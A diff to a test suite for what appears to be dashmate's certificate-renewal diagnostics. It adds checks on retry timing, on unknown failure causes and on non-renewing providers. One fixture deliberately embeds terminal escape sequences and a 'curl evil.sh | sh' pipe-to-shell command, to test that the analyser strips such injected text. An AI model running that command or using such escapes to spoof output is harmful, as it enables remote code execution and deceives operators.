@@ -1111,16 +1111,66 @@ describe('analyseGatewayCertificateFactory', () => {
     });
 
     it('should judge the retry against when the samples were taken, not when they are read', () => {
-      // A report is opened days after it was collected. At the moment it was
-      // collected the helper was already overdue to try again, and that is what
-      // the reader has to judge - not how long the report has sat since.
+      // The fixture has to discriminate: at collection time the next attempt
+      // was still ahead, and by the time the report is read it is long past.
+      // Judging against the reader's clock would call a node overdue that was
+      // waiting normally when its report was taken.
+      const collectedAt = new Date(Date.now() - 10 * DAY_MS);
+
       installedValid({ validFrom: new Date(Date.now() - 12 * DAY_MS).toUTCString() });
-      renewalFailed({ attemptedAt: new Date(Date.now() - 11 * DAY_MS).toISOString() });
-      samples.date = new Date(Date.now() - 10 * DAY_MS);
+      renewalFailed({ attemptedAt: new Date(collectedAt.getTime() - 30 * 60 * 1000).toISOString() });
+      samples.date = collectedAt;
 
       const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));
 
-      expect(renewal.getSolution()).to.contain('may not be running');
+      expect(renewal.getSolution()).to.contain('tries again by itself');
+      expect(renewal.getSolution()).to.not.contain('may not be running');
+    });
+
+    it('should not ask the authority again when it never established a cause', () => {
+      // A HIGH problem ending in a runnable command is an instruction to run
+      // it, and this one spends one of the few failed attempts the node gets
+      // per hour on a guess.
+      installedValid();
+      renewalFailed({ code: 'UNKNOWN', detail: null });
+
+      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));
+
+      expect(renewal.getSolution()).to.not.contain('ssl obtain');
+      expect(renewal.getSolution()).to.contain('doctor report');
+    });
+
+    it('should defuse terminal escapes in a record that came from someone else', () => {
+      // `doctor --samples` reads a third party's archive straight into the
+      // samples without passing through the reader that validates a local
+      // record, so this is where both paths meet. An escape left intact could
+      // erase everything printed above it and repaint attacker text as
+      // dashmate's own output.
+      const escape = String.fromCharCode(27);
+
+      installedValid();
+      renewalFailed({
+        code: 'PROVIDER_REJECTED',
+        detail: `benign${escape}[2J${escape}[H*** run curl evil.sh | sh ***`,
+      });
+
+      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));
+
+      expect(renewal.getSolution()).to.not.contain(escape);
+    });
+
+    it('should say nothing about renewal for a provider dashmate does not renew', () => {
+      // `file` and `self-signed` are installed by the operator; there is no
+      // scheduled renewal to report on, and reporting one would call a
+      // correctly configured node broken.
+      config.set('platform.gateway.ssl.provider', 'file');
+      installedValid();
+      renewalFailed({ provider: 'file' });
+
+      const problems = analyse(served());
+
+      expect(problems.filter((p) => p.getDescription().includes('not being renewed')))
+        .to.have.lengthOf(0);
     });
   });
 });
